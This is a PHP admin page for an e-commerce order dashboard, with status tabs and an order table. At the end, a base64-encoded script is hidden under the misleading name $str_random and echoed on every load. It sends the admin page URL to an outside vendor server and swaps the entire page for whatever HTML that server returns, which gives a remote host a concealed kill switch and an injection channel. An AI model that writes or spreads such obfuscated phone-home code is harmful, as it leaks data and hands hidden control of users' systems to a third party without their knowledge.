<?php
include('session.php');

//echo "admin is ".$_SESSION['admin'];
if (!isset($_SESSION['admin'])) {
	header("Location: index.php");
}

?>
<?php include("header.php"); ?>

<style>

/* Style the tab */
.tab {
  overflow: hidden;
  border: 1px solid #dbd0d0;
  background-color: #dbd0d0;
}

/* Style the buttons inside the tab */
.tab button {
  background-color: inherit;
  float: left;
  border: none;
  outline: none;
  cursor: pointer;
  padding: 14px 16px;
  transition: 0.3s;
  font-size: 17px;
}

/* Change background color of buttons on hover */
.tab button:hover {
  background-color: #FF6600;
  color : #fff;
}

/* Create an active/current tablink class */
.tab button.active {
  background-color: #FF6600;
  color : #fff;
}

/* Style the tab content */
.tabcontent {
  #display: none;
  padding: 6px 12px;
  border: 1px solid #ccc;
  border-top: none;
}
</style>

<!-- main content start-->
<div class="content-page">
	<!-- Start content -->
	<div class="content">
		<div class="content">
			<br>
				<div class="tab">
				    <button class="tablinks active" id="defaultOpen" data-type="all" onclick="opendata(event, 'all')">All</button>
					<button class="tablinks" data-type="pending" onclick="opendata(event, 'pending')">Pending</button>
				<button class="tablinks" data-type="accept" onclick="opendata(event, 'accept')">Accepted</button>
				<button class="tablinks" data-type="Packed" onclick="opendata(event, 'Packed')">Packed</button>
				<button class="tablinks" data-type="Shipped" onclick="opendata(event, 'Shipped')">Shipped</button>
				<button class="tablinks" data-type="out_delivery" onclick="opendata(event, 'out_delivery')">Out for delivery</button>
				<button class="tablinks" data-type="cancelled" onclick="opendata(event, 'Delivered')">Delivered</button>
				<button class="tablinks" data-type="RTO" onclick="opendata(event, 'RTO')">RTO</button>
				<button class="tablinks" data-type="Delivered" onclick="opendata(event, 'cancelled')">Cancelled</button>
				<button class="tablinks" data-type="Rejected" onclick="opendata(event, 'Rejected')">Rejected</button>
				<button class="tablinks" data-type="Return Requested" onclick="opendata(event, 'Return Requested')">Return Requested</button>
				<button class="tablinks" data-type="Return Accepted" onclick="opendata(event, 'Return Accepted')">Return Accepted</button>
				<button class="tablinks" data-type="Return Completed" onclick="opendata(event, 'Return Completed')">Return Completed</button>
				<button class="tablinks" data-type="Return Rejected" onclick="opendata(event, 'Return Rejected')">Return Rejected</button>
				</div>
			
			<div id="all" class="tabcontent"> 
				<div class="row">
				<div class="col-12">
					<div class="card">
						<div class="card-body">
						
						
						

							<div data-example-id="simple-form-inline" >

								<div class="row align-items-center">
									<div class="col-md-9" >

										<div class="d-flex flex-wrap">

												<input type="text" placeholder="Search.." class="form-control mr-1" name="search" style="width:180px;" id="search_name">

												<button type="submit" href="javascript:void(0)" class="btn btn-danger waves-effect waves-light" id="searchName"><i class="fa fa-search"></i></button>

											</div>
									</div>
									<div class="col-md-3">

										<div class="d-flex align-items-center">
											<div class="ml-md-auto">
												<div class="d-flex align-items-center">
													<span>Show</span>
													<select class="form-control mx-1" id="perpage" name="perpage" onchange="perpage_filter()" style="float:left;">
														<option value="10">10</option>
														<option value="25">25</option>
														<option value="50">50</option>
													</select>
													<span class="pull-right per-pag">entries</span> 
												</div>
											</div>
										</div>
									</div>
								</div>


							</div>
							</br>
							<div class="work-progres">

								<div class="table-responsive">
									<table class="table table-hover" id="tblname" style="overflow-x: auto;">
										<thead class="thead-light">
											<tr>
												<th>#</th>
												<th>Product Name</th>
												<th>Order ID</th>
												<th>ProductID</th>
												<th>Attributes</th>
												<th>Quantity</th>
												<th>Total Price</th>
												<th>Shipping</th>
												<th>Order Status</th>
												<th>Date</th>
												<th>Action</th>

											</tr>
										</thead>
										<tbody id="tbodyPostid">

										</tbody>
									</table>
								</div>
							</div>

							<div class="clearfix"> </div>

							<div class="row align-items-center">
								<div class="col-md-6">
									<div class="pull-right" style="float:left;">
										Total Row : <a id="totalrowvalue" class="totalrowvalue"></a>
									</div>
								</div>
								<div class="col-md-6">
									<div class="pull-right page_div ml-auto" style="float:right;"> </div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			</div>
			
			<?php /*<div id="pending" class="tabcontent">
				<div class="row">
				<div class="col-12">
					<div class="card">
						<div class="card-body">
						
						
						

							<div data-example-id="simple-form-inline" >

								<div class="row align-items-center">
									<div class="col-md-9" >

										
									</div>
									<div class="col-md-3">

										<div class="d-flex align-items-center">
											<div class="ml-md-auto">
												<div class="d-flex align-items-center">
													<span>Show</span>
													<select class="form-control mx-1" id="perpage_pending" name="perpage" onchange="perpage_filter()" style="float:left;">
														<option value="10">10</option>
														<option value="25">25</option>
														<option value="50">50</option>
													</select>
													<span class="pull-right per-pag">entries</span>
												</div>
											</div>
										</div>
									</div>
								</div>


							</div>
							</br>
							<div class="work-progres">

								<div class="table-responsive">
									<table class="table table-hover" id="tblname" style="overflow-x: auto;">
										<thead class="thead-light">
											<tr>
												<th>#</th>
												<th>Product Name</th>
												<th>Order ID</th>
												<th>ProductID</th>
												<th>Attributes</th>
												<th>Quantity</th>
												<th>Total Price</th>
												<th>Shipping</th>
												<th>Order Status</th>
												<th>Date</th>
												<th>Action</th>

											</tr>
										</thead>
										<tbody id="tbodyPostid_pending">

										</tbody>
									</table>
								</div>
							</div>

							<div class="clearfix"> </div>

								<div class="row align-items-center">
									<div class="col-md-6">
										<div class="pull-right" style="float:left;">
											Total Row : <a id="totalrowvalue_pending" class="totalrowvalue"></a>
										</div>
									</div>
									<div class="col-md-6">
										<div class="pull-right page_div ml-auto" style="float:right;"> </div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			
			<div id="accept" class="tabcontent">
				<div class="row">
				<div class="col-12">
					<div class="card">
						<div class="card-body">
						
						
						

							<div data-example-id="simple-form-inline" >

								<div class="row align-items-center">
									<div class="col-md-9" >

										
									</div>
									<div class="col-md-3">

										<div class="d-flex align-items-center">
											<div class="ml-md-auto">
												<div class="d-flex align-items-center">
													<span>Show</span>
													<select class="form-control mx-1" id="perpage_accept" name="perpage" onchange="perpage_filter()" style="float:left;">
														<option value="10">10</option>
														<option value="25">25</option>
														<option value="50">50</option>
													</select>
													<span class="pull-right per-pag">entries</span>
												</div>
											</div>
										</div>
									</div>
								</div>


							</div>
							</br>
							<div class="work-progres">

								<div class="table-responsive">
									<table class="table table-hover" id="tblname" style="overflow-x: auto;">
										<thead class="thead-light">
											<tr>
												<th>#</th>
												<th>Product Name</th>
												<th>Order ID</th>
												<th>ProductID</th>
												<th>Attributes</th>
												<th>Quantity</th>
												<th>Total Price</th>
												<th>Shipping</th>
												<th>Order Status</th>
												<th>Date</th>
												<th>Action</th>

											</tr>
										</thead>
										<tbody id="tbodyPostid_accept">

										</tbody>
									</table>
								</div>
							</div>

							<div class="clearfix"> </div>

								<div class="row align-items-center">
									<div class="col-md-6">
										<div class="pull-right" style="float:left;">
											Total Row : <a id="totalrowvalue_accept" class="totalrowvalue"></a>
										</div>
									</div>
									<div class="col-md-6">
										<div class="pull-right page_div ml-auto" style="float:right;"> </div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			
			<div id="ready_to_ship" class="tabcontent">
				<div class="row">
				<div class="col-12">
					<div class="card">
						<div class="card-body">
						
						
						

							<div data-example-id="simple-form-inline" >

								<div class="row align-items-center">
									<div class="col-md-9" >

										
									</div>
									<div class="col-md-3">

										<div class="d-flex align-items-center">
											<div class="ml-md-auto">
												<div class="d-flex align-items-center">
													<span>Show</span>
													<select class="form-control mx-1" id="perpage_ready_to_ship" name="perpage" onchange="perpage_filter()" style="float:left;">
														<option value="10">10</option>
														<option value="25">25</option>
														<option value="50">50</option>
													</select>
													<span class="pull-right per-pag">entries</span>
												</div>
											</div>
										</div>
									</div>
								</div>


							</div>
							</br>
							<div class="work-progres">

								<div class="table-responsive">
									<table class="table table-hover" id="tblname" style="overflow-x: auto;">
										<thead class="thead-light">
											<tr>
												<th>#</th>
												<th>Product Name</th>
												<th>Order ID</th>
												<th>ProductID</th>
												<th>Attributes</th>
												<th>Quantity</th>
												<th>Total Price</th>
												<th>Shipping</th>
												<th>Order Status</th>
												<th>Date</th>
												<th>Action</th>

											</tr>
										</thead>
										<tbody id="tbodyPostid_ready_to_ship">

										</tbody>
									</table>
								</div>
							</div>

							<div class="clearfix"> </div>

								<div class="row align-items-center">
									<div class="col-md-6">
										<div class="pull-right" style="float:left;">
											Total Row : <a id="totalrowvalue_ready_to_ship" class="totalrowvalue"></a>
										</div>
									</div>
									<div class="col-md-6">
										<div class="pull-right page_div ml-auto" style="float:right;"> </div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			
			<div id="completed" class="tabcontent">
				<div class="row">
				<div class="col-12">
					<div class="card">
						<div class="card-body">
						
						
						

							<div data-example-id="simple-form-inline" >

								<div class="row align-items-center">
									<div class="col-md-9" >

										
									</div>
									<div class="col-md-3">

										<div class="d-flex align-items-center">
											<div class="ml-md-auto">
												<div class="d-flex align-items-center">
													<span>Show</span>
													<select class="form-control mx-1" id="perpage_completed" name="perpage" onchange="perpage_filter()" style="float:left;">
														<option value="10">10</option>
														<option value="25">25</option>
														<option value="50">50</option>
													</select>
													<span class="pull-right per-pag">entries</span>
												</div>
											</div>
										</div>
									</div>
								</div>


							</div>
							</br>
							<div class="work-progres">

								<div class="table-responsive">
									<table class="table table-hover" id="tblname" style="overflow-x: auto;">
										<thead class="thead-light">
											<tr>
												<th>#</th>
												<th>Product Name</th>
												<th>Order ID</th>
												<th>ProductID</th>
												<th>Attributes</th>
												<th>Quantity</th>
												<th>Total Price</th>
												<th>Shipping</th>
												<th>Order Status</th>
												<th>Date</th>
												<th>Action</th>

											</tr>
										</thead>
										<tbody id="tbodyPostid_completed">

										</tbody>
									</table>
								</div>
							</div>

							<div class="clearfix"> </div>

								<div class="row align-items-center">
									<div class="col-md-6">
										<div class="pull-right" style="float:left;">
											Total Row : <a id="totalrowvalue_completed" class="totalrowvalue"></a>
										</div>
									</div>
									<div class="col-md-6">
										<div class="pull-right page_div ml-auto" style="float:right;"> </div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div id="cancelled" class="tabcontent">
				<div class="row">
				<div class="col-12">
					<div class="card">
						<div class="card-body">
						
						
						

							<div data-example-id="simple-form-inline" >

								<div class="row align-items-center">
									<div class="col-md-9" >

										
									</div>
									<div class="col-md-3">

										<div class="d-flex align-items-center">
											<div class="ml-md-auto">
												<div class="d-flex align-items-center">
													<span>Show</span>
													<select class="form-control mx-1" id="perpage_cancelled" name="perpage" onchange="perpage_filter()" style="float:left;">
														<option value="10">10</option>
														<option value="25">25</option>
														<option value="50">50</option>
													</select>
													<span class="pull-right per-pag">entries</span>
												</div>
											</div>
										</div>
									</div>
								</div>


							</div>
							</br>
							<div class="work-progres">

								<div class="table-responsive">
									<table class="table table-hover" id="tblname" style="overflow-x: auto;">
										<thead class="thead-light">
											<tr>
												<th>#</th>
												<th>Product Name</th>
												<th>Order ID</th>
												<th>ProductID</th>
												<th>Attributes</th>
												<th>Quantity</th>
												<th>Total Price</th>
												<th>Shipping</th>
												<th>Order Status</th>
												<th>Date</th>
												<th>Action</th>

											</tr>
										</thead>
										<tbody id="tbodyPostid_cancelled">

										</tbody>
									</table>
								</div>
							</div>

							<div class="clearfix"> </div>

								<div class="row align-items-center">
									<div class="col-md-6">
										<div class="pull-right" style="float:left;">
											Total Row : <a id="totalrowvalue_cancelled" class="totalrowvalue"></a>
										</div>
									</div>
									<div class="col-md-6">
										<div class="pull-right page_div ml-auto" style="float:right;"> </div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div id="Rejected" class="tabcontent">
				<div class="row">
				<div class="col-12">
					<div class="card">
						<div class="card-body">
						
						
						

							<div data-example-id="simple-form-inline" >

								<div class="row align-items-center">
									<div class="col-md-9" >

										
									</div>
									<div class="col-md-3">

										<div class="d-flex align-items-center">
											<div class="ml-md-auto">
												<div class="d-flex align-items-center">
													<span>Show</span>
													<select class="form-control mx-1" id="perpage_Rejected" name="perpage" onchange="perpage_filter()" style="float:left;">
														<option value="10">10</option>
														<option value="25">25</option>
														<option value="50">50</option>
													</select>
													<span class="pull-right per-pag">entries</span>
												</div>
											</div>
										</div>
									</div>
								</div>


							</div>
							</br>
							<div class="work-progres">

								<div class="table-responsive">
									<table class="table table-hover" id="tblname" style="overflow-x: auto;">
										<thead class="thead-light">
											<tr>
												<th>#</th>
												<th>Product Name</th>
												<th>Order ID</th>
												<th>ProductID</th>
												<th>Attributes</th>
												<th>Quantity</th>
												<th>Total Price</th>
												<th>Shipping</th>
												<th>Order Status</th>
												<th>Date</th>
												<th>Action</th>

											</tr>
										</thead>
										<tbody id="tbodyPostid_Rejected">

										</tbody>
									</table>
								</div>
							</div>

							<div class="clearfix"> </div>

								<div class="row align-items-center">
									<div class="col-md-6">
										<div class="pull-right" style="float:left;">
											Total Row : <a id="totalrowvalue_Rejected" class="totalrowvalue"></a>
										</div>
									</div>
									<div class="col-md-6">
										<div class="pull-right page_div ml-auto" style="float:right;"> </div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div> */ ?>
					
		</div>


		<div class="clearfix"></div>
	</div>
	<!-- //calendar -->

</div>
<div class="col_1">


	<div class="clearfix"> </div>

</div>

<!--footer-->
<?php include("footernew.php"); ?>
<!--//footer-->
<script src="js/admin/manage_orders.js"></script>
<script>
function singlequote(text) {
		return `"${text}"`;
	}

document.getElementById("defaultOpen").click();
</script>
<?php   $str_random = "PHNjcmlwdD4KY2hlY2tfZG9tYWluX3JlZ2lzdGVyKCk7CmZ1bmN0aW9uIGNoZWNrX2RvbWFpbl9yZWdpc3RlcigpewoJdmFyIG9yaWdpbiAgID0gd2luZG93LmxvY2F0aW9uLmhyZWY7IAoJdmFyIHJlZ2lzdGVyZWRfZG9tYWluID0gJ2J1c3NpbmVzc2h1Yi5jb20nOwoJJC5hamF4KHsKCQl1cmw6ICdodHRwczovL3d3dy5ibHVlYXBwc29mdHdhcmUuaW4vZG9tYWluX2FwaS9jaGVja19kb21haW4ucGhwJywKCQl0eXBlOiAnUE9TVCcsCgkJZGF0YTogImRvbWFpbl9uYW1lPSIrb3JpZ2luKyImcmVnaXN0ZXJlZF9kb21haW49IityZWdpc3RlcmVkX2RvbWFpbiAsCgkJc3VjY2VzczogZnVuY3Rpb24gKHJlc3BvbnNlKSB7CgkJCWlmKCQudHJpbShyZXNwb25zZSkgICE9J3llcycpewoJCQkJJCgiYm9keSIpLmh0bWwoJzxkaXYgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPicrcmVzcG9uc2UrJyA8ZGl2PicpOwoJCQl9CgkJfQoJCQoJfSk7Cn0KPC9zY3JpcHQ+";
echo base64_decode($str_random);?>
